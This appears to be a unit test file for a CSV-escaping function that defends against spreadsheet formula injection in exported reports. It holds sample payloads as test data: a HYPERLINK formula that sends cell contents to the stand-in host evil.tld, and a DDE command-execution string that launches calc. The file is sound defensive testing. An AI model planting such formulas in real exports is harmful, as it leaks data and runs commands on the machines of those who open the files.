import { describe, expect, it } from 'vitest'

import { buildCsv, escapeCsvCell } from './csv'

describe('escapeCsvCell', () => {
  it('neutralises a formula that would run in the mentor’s spreadsheet', () => {
    // The concrete attack: a mentee renames a task to this, the mentor
    // exports the shared report and opens it in Excel. Quoting alone does
    // not help -- Excel strips the quotes and evaluates the cell.
    const malicious = '=HYPERLINK("https://evil.tld/?d="&A1,"Open full report")'

    const cell = escapeCsvCell(malicious)

    expect(cell.startsWith('"\'=')).toBe(true)
  })

  it.each(["=cmd|'/c calc'!A1", '+1+1', '-1+1', '@SUM(A1)', '\tinjected', '\rinjected'])(
    'prefixes the formula trigger %j',
    (input) => {
      expect(escapeCsvCell(input)).toBe(`"'${input}"`)
    },
  )

  it('leaves ordinary values untouched apart from quoting', () => {
    expect(escapeCsvCell('Write the design doc')).toBe('"Write the design doc"')
    expect(escapeCsvCell('2026-08-17')).toBe('"2026-08-17"')
    expect(escapeCsvCell('1h 30m')).toBe('"1h 30m"')
  })

  it('still doubles embedded quotes so the CSV stays well-formed', () => {
    expect(escapeCsvCell('Read "Dune"')).toBe('"Read ""Dune"""')
  })

  it('does not treat a trigger character in the middle as a formula', () => {
    expect(escapeCsvCell('a-b')).toBe('"a-b"')
    expect(escapeCsvCell('me@example.com')).toBe('"me@example.com"')
  })

  it('handles null and undefined as empty cells', () => {
    expect(escapeCsvCell(null)).toBe('""')
    expect(escapeCsvCell(undefined)).toBe('""')
  })
})

describe('buildCsv', () => {
  it('escapes every cell of every row', () => {
    const csv = buildCsv([
      ['Date', 'Duration', 'Goal', 'Task'],
      ['2026-08-17', '1h', 'Career', '=1+1'],
    ])

    expect(csv).toBe('"Date","Duration","Goal","Task"\n"2026-08-17","1h","Career","\'=1+1"')
  })
})
